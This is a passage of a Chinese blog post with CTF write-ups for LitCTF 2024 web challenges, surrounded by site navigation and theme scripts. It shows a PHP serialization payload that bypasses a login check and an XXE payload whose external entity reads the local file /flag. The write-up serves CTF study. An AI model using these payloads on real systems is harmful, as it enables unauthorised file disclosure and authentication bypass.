+### [LitCTF 2024]SAS - Serializing Authentication
+
+题目描述
+
+请务必按照要求以正确的姿势的插入密钥(●’◡’●)
+| flag头即为flag{}
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240617213025806.png" alt="图片" width="300" height="200">
+
+这个PHP代码定义了一个名为 User 的类，并包括以下几个部分：
+属性：
+$username：公共属性，用于存储用户名。
+$password：公共属性，用于存储密码。
+构造函数：
+__construct($username, $password)：这是类的构造函数，接受两个参数（用户名和密码）。构造函数在创建对象时被自动调用，初始化 username 和 password 属性。
+
+方法：
+isValid()：这个方法用于验证用户名和密码是否匹配预定义的值。它返回一个布尔值（true 或 false）。在这个示例中，当 username 为 'admin' 且 password 为 'secure_password' 时，返回 true，否则返回 false。
+
+构造payload 
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&quot;secure_password&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+运行
+
+<img src="/images/tutu/image-20240617213927200.png" alt="图片" width="300" height="200">
+
+base64加密
+
+<img src="/images/tutu/image-20240617214037904.png" alt="图片" width="300" height="200">
+
+将base编码填入输入框里
+
+<img src="/images/tutu/image-20240617214204554.png" alt="图片" width="300" height="200">
+
+
+
+### [LitCTF 2024]exx
+
+
+
+打开环境
+
+<img src="/images/tutu/image-20240617214505074.png" alt="图片" width="300" height="200">
+
+根据题目考察xxe
+
+payload
+
+
+
+<?xml version="1.0"?>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">XXE</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;XXE;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/images/tutu/image-20240617215514213.png" alt="图片" width="300" height="200">
+      
+    </div>
+    <footer class="article-footer">
+      
+      <a data-url="http://example.com/2024/06/02/LitCTF2023-2024%20WEB/" data-id="clxjtvcod0000sww372biagfa" data-title="LitCTF2023-2024 WEB所有题复现" class="article-share-link">分享</a>
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="polarctf" class="lazyload">
+          
+        
+        <a href="/2024/06/02/ploarctf%20xiajkimisc/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            polarctf
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="Hello World" class="lazyload">
+        
+      
+      <a href="/2024/06/02/hello-world/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          Hello World
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E6%88%91Flag%E5%91%A2%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">[LitCTF 2023]我Flag呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="toc-number">2.</span> <span class="toc-text">[LitCTF 2023]PHP是世界上最好的语言！！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="toc-number">3.</span> <span class="toc-text">[LitCTF 2023]导弹迷踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-Follow-me-and-hack-me"><span class="toc-number">4.</span> <span class="toc-text">[LitCTF 2023]Follow me and hack me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-Ping"><span class="toc-number">5.</span> <span class="toc-text">[LitCTF 2023]Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-1zjs"><span class="toc-number">6.</span> <span class="toc-text">[LitCTF 2023]1zjs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">7.</span> <span class="toc-text">[LitCTF 2023]作业管理系统</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="yiqing" class="lazyload">
+  <div class="sidebar-author-name">yiqing</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        yiqing
+      </div>
+      
+        <div>
+          基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          766
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          00:03
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E6%88%91Flag%E5%91%A2%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">[LitCTF 2023]我Flag呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="toc-number">2.</span> <span class="toc-text">[LitCTF 2023]PHP是世界上最好的语言！！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="toc-number">3.</span> <span class="toc-text">[LitCTF 2023]导弹迷踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-Follow-me-and-hack-me"><span class="toc-number">4.</span> <span class="toc-text">[LitCTF 2023]Follow me and hack me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-Ping"><span class="toc-number">5.</span> <span class="toc-text">[LitCTF 2023]Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-1zjs"><span class="toc-number">6.</span> <span class="toc-text">[LitCTF 2023]1zjs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">7.</span> <span class="toc-text">[LitCTF 2023]作业管理系统</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="yiqing" class="lazyload">
+  <div class="sidebar-author-name">yiqing</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.js";
+  
+  const pswp = () => {
+    if (document.querySelectorAll('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    if(document.querySelectorAll('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.2.0-beta.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
